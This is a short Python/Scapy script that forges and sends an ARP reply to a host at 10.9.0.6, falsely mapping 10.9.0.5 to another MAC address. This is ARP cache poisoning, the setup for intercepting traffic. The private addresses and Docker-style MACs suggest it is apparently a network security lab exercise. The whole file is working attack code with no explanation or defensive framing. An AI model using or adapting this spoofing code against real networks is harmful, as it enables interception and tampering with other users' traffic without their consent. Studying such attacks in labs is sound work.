#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

gateway_mac = '02:42:0a:09:00:69'
target_ip = '10.9.0.6'
target_mac = '02:42:0a:09:00:06'
impersonating_ip = '10.9.0.5'

# Constructing Ethernet and ARP packets
ether = Ether(src=gateway_mac, dst=target_mac)
arp = ARP(psrc=impersonating_ip,hwsrc=gateway_mac , pdst=target_ip ,hwdst=target_mac)
arp.op = 2  # ARP reply

# Combining Ethernet and ARP layers
frame = ether / arp

# Sending the ARP spoof packet
sendp(frame)
